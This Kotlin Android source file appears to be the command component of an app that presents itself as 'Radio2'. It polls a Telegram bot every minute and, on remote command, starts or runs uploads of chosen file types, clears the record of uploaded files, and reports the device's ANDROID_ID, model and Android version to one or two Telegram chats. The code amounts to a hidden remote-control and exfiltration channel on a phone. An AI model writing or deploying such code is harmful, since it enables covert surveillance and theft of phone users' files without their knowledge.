package com.service.assasinscreed02

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import android.util.Log
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*

class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "TelegramCommandWorker"
    }

    private val workerScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun doWork(): Result {
        try {
            Log.d(TAG, "Iniciando escucha de comandos de Telegram")
            
            val config = obtenerConfigBot(applicationContext)
            if (config == null) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return reprogramarWorker()
            }
            
            val (token, chatId) = config
            if (token.isBlank() || chatId.isBlank()) {
                Log.w(TAG, "Token o chat ID vacíos")
                return reprogramarWorker()
            }
            
            val url = "https://api.telegram.org/bot$token/getUpdates"
            val request = Request.Builder().url(url).build()
            
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build()
                
            val response = client.newCall(request).execute()
            
            if (response.isSuccessful) {
                val body = response.body?.string() ?: ""
                if (body.isNotBlank()) {
                    procesarComandos(body, token, chatId)
                }
            } else {
                Log.w(TAG, "Error obteniendo updates: ${response.code}")
            }
            
            response.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error en TelegramCommandWorker: ${e.message}", e)
        }
        
        return reprogramarWorker()
    }
    
    private fun procesarComandos(jsonResponse: String, token: String, chatId: String) {
        try {
            val json = JSONObject(jsonResponse)
            if (!json.has("result")) {
                Log.w(TAG, "Respuesta de Telegram no contiene 'result'")
                return
            }
            
            val result = json.getJSONArray("result")
            for (i in 0 until result.length()) {
                try {
                    val update = result.getJSONObject(i)
                    val message = update.optJSONObject("message") ?: continue
                    val fromChatId = message.optJSONObject("chat")?.optString("id") ?: continue
                    val text = message.optString("text", "")
                    
                    if (fromChatId == chatId && text.isNotBlank()) {
                        procesarComando(text, token, chatId)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando mensaje: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando comandos: ${e.message}", e)
        }
    }
    
    private fun procesarComando(text: String, token: String, chatId: String) {
        when {
            text.contains("/ayuda", ignoreCase = true) || text.contains("/help", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: ayuda")
                mostrarAyuda(token, chatId)
            }
            text.contains("/iniciar_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: iniciar_backup")
                try {
                    programarBackup(applicationContext, obtenerIntervalo(applicationContext).toLong())
                    enviarConfirmacionTelegram(token, chatId, "✅ Backup automático iniciado en el dispositivo.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup: "+e.message)
                }
            }
            text.contains("/backup_manual", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: backup_manual")
                try {
                    iniciarBackupManual(token, chatId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup manual: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup manual: "+e.message)
                }
            }
            text.contains("/estado", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estado")
                try {
                    val estado = obtenerEstadoBackup()
                    val mensaje = if (estado.isNullOrBlank()) "⚠️ No hay información de estado disponible." else "📊 Estado del backup: $estado"
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estado: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estado: "+e.message)
                }
            }
            text.contains("/estadisticas", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estadisticas")
                try {
                    val estadisticas = obtenerEstadisticas()
                    enviarConfirmacionTelegram(token, chatId, estadisticas)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estadísticas: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estadísticas: "+e.message)
                }
            }
            text.contains("/configuracion", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: configuracion")
                try {
                    val config = obtenerConfiguracion()
                    val mensaje = if (config.isNullOrBlank()) "⚠️ No hay configuración disponible." else config
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo configuración: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo configuración: "+e.message)
                }
            }
            text.contains("/detener_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: detener_backup")
                try {
                    detenerBackup()
                    enviarConfirmacionTelegram(token, chatId, "🛑 Backup automático detenido.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error deteniendo backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error deteniendo backup: "+e.message)
                }
            }
            text.contains("/limpiar_historial", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: limpiar_historial")
                try {
                    limpiarHistorial()
                    enviarConfirmacionTelegram(token, chatId, "🧹 Historial de archivos limpiado.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error limpiando historial: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error limpiando historial: "+e.message)
                }
            }
            text.contains("/dispositivo", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: dispositivo")
                try {
                    val info = obtenerInfoDispositivo()
                    val mensaje = if (info.isNullOrBlank()) "⚠️ No hay información del dispositivo disponible." else info
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo info del dispositivo: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo info del dispositivo: "+e.message)
                }
            }
        }
    }

    private fun mostrarAyuda(token: String, chatId: String) {
        val ayuda = """
            🤖 *Comandos disponibles:*
            
            📋 */ayuda* - Muestra esta lista de comandos
            🔄 */iniciar_backup* - Inicia el backup automático
            📤 */backup_manual* - Ejecuta un backup manual inmediato
            📊 */estado* - Muestra el estado del backup
            📈 */estadisticas* - Muestra estadísticas de uso
            ⚙️ */configuracion* - Muestra la configuración actual
            🛑 */detener_backup* - Detiene el backup automático
            🧹 */limpiar_historial* - Limpia el historial de archivos
            📱 */dispositivo* - Información del dispositivo
            
            _Envía cualquier comando para ejecutarlo._
        """.trimIndent()
        val chatIdSecundario = obtenerChatIdSecundario(applicationContext)
        val mensaje = if (ayuda.isBlank()) "⚠️ No hay ayuda disponible." else ayuda
        Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
        enviarConfirmacionTelegram(token, chatIdSecundario ?: chatId, mensaje)
    }

    private fun iniciarBackupManual(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🚀 Iniciando backup manual...")
            workerScope.launch {
                try {
                    val resultado = BackupUtils.ejecutarBackupManual(applicationContext)
                    val mensaje = if (resultado) {
                        "✅ Backup manual completado exitosamente"
                    } else {
                        "⚠️ Backup manual completado con errores"
                    }
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    enviarConfirmacionTelegram(token, chatId, "❌ Error en backup manual: ${e.message}")
                }
            }
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerEstadisticas(): String {
        return try {
            val archivosSubidos = ErrorHandler.obtenerCantidadArchivosSubidos(applicationContext)
            val (ultima, anterior) = obtenerHistorial(applicationContext)
            val formato = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            
            val ultimaStr = if (ultima != 0L) formato.format(Date(ultima)) else "Nunca"
            val anteriorStr = if (anterior != 0L) formato.format(Date(anterior)) else "Nunca"
            
            """
                📈 *Estadísticas del dispositivo:*
                
                📁 Archivos subidos: $archivosSubidos
                🕐 Última conexión: $ultimaStr
                ⏰ Conexión anterior: $anteriorStr
                📱 Dispositivo: ${android.os.Build.MODEL}
                🤖 Android: ${android.os.Build.VERSION.RELEASE}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo estadísticas: ${e.message}"
        }
    }

    private fun obtenerConfiguracion(): String {
        return try {
            val intervalo = obtenerIntervalo(applicationContext)
            val tiposArchivo = obtenerTiposArchivo(applicationContext)
            val backupPorFases = obtenerBackupPorFases(applicationContext)
            
            """
                ⚙️ *Configuración actual:*
                
                ⏰ Intervalo de backup: $intervalo horas
                📁 Tipos de archivo: ${tiposArchivo.joinToString(", ")}
                🔄 Backup por fases: ${if (backupPorFases) "Activado" else "Desactivado"}
                📱 Dispositivo: ${android.os.Build.MODEL}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo configuración: ${e.message}"
        }
    }

    private fun detenerBackup() {
        try {
            WorkManager.getInstance(applicationContext).cancelAllWorkByTag("backup_worker")
            WorkManager.getInstance(applicationContext).cancelUniqueWork("backup_trabajo")
        } catch (e: Exception) {
            throw e
        }
    }

    private fun limpiarHistorial() {
        try {
            ErrorHandler.limpiarRegistroArchivos(applicationContext)
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerInfoDispositivo(): String {
        return try {
            val deviceId = android.provider.Settings.Secure.getString(
                applicationContext.contentResolver, 
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            """
                📱 *Información del dispositivo:*
                
                🆔 ID: $deviceId
                📱 Modelo: ${android.os.Build.MODEL}
                🏭 Fabricante: ${android.os.Build.MANUFACTURER}
                🤖 Android: ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})
                📦 App: Radio2 v1.0.0
                🕐 Última actualización: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo info del dispositivo: ${e.message}"
        }
    }
    
    private fun obtenerEstadoBackup(): String {
        return try {
            val workInfos = WorkManager.getInstance(applicationContext)
                .getWorkInfosForUniqueWork("backup_trabajo")
                .get()
            
            if (workInfos.isEmpty()) {
                "Servicio detenido"
            } else {
                val estado = workInfos[0].state
                when (estado) {
                    androidx.work.WorkInfo.State.ENQUEUED -> "Servicio programado"
                    androidx.work.WorkInfo.State.RUNNING -> "Servicio ejecutándose"
                    androidx.work.WorkInfo.State.SUCCEEDED -> "Última ejecución exitosa"
                    androidx.work.WorkInfo.State.FAILED -> "Última ejecución fallida"
                    else -> "Estado: $estado"
                }
            }
        } catch (e: Exception) {
            "Error obteniendo estado: ${e.message}"
        }
    }
    
    private fun reprogramarWorker(): Result {
        try {
            val next = OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()
                
            WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                "telegram_command_listener",
                ExistingWorkPolicy.REPLACE,
                next
            )
            Log.d(TAG, "Worker reprogramado para ejecutarse en 1 minuto")
        } catch (e: Exception) {
            Log.e(TAG, "Error reprogramando worker: ${e.message}", e)
        }
        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        workerScope.cancel()
    }
}

fun enviarConfirmacionTelegram(token: String, chatId: String, mensaje: String) {
    val maxReintentos = 5
    var intento = 1
    var backoff = 1000L // 1 segundo
    val maxBackoff = 60000L // 1 minuto
    while (intento <= maxReintentos) {
        try {
            val url = "https://api.telegram.org/bot$token/sendMessage"
            val json = org.json.JSONObject().apply {
                put("chat_id", chatId)
                put("text", mensaje)
                put("parse_mode", "Markdown")
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val client = OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""
            if (response.isSuccessful) {
                Log.d("TelegramCommandWorker", "Mensaje enviado: $mensaje")
                response.close()
                break
            } else {
                // Manejo de error 429 (rate limit)
                if (response.code == 429) {
                    var retryAfter = 0L
                    try {
                        val jsonResp = org.json.JSONObject(responseBody)
                        retryAfter = jsonResp.optJSONObject("parameters")?.optLong("retry_after") ?: 0L
                    } catch (_: Exception) {}
                    if (retryAfter > 0) {
                        Log.w("TelegramCommandWorker", "Error 429: esperando $retryAfter segundos antes de reintentar")
                        Thread.sleep(retryAfter * 1000)
                    } else {
                        Log.w("TelegramCommandWorker", "Error 429: esperando $backoff ms antes de reintentar")
                        Thread.sleep(backoff)
                        backoff = (backoff * 2).coerceAtMost(maxBackoff)
                    }
                    intento++
                } else {
                    Log.w("TelegramCommandWorker", "Error enviando mensaje: ${response.code} - $responseBody")
                    response.close()
                    break
                }
            }
            response.close()
        } catch (e: Exception) {
            Log.e("TelegramCommandWorker", "Error enviando confirmación: ${e.message}", e)
            try { Thread.sleep(backoff) } catch (_: Exception) {}
            backoff = (backoff * 2).coerceAtMost(maxBackoff)
            intento++
        }
    }
    if (intento > maxReintentos) {
        Log.e("TelegramCommandWorker", "No se pudo enviar el mensaje tras $maxReintentos intentos: $mensaje")
    }
} 

// Añadir función para obtener chat_id secundario
private fun obtenerChatIdSecundario(context: Context): String? {
    return try {
        val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
        prefs.getString("bot_chat_id_secundario", null)
    } catch (e: Exception) {
        null
    }
} 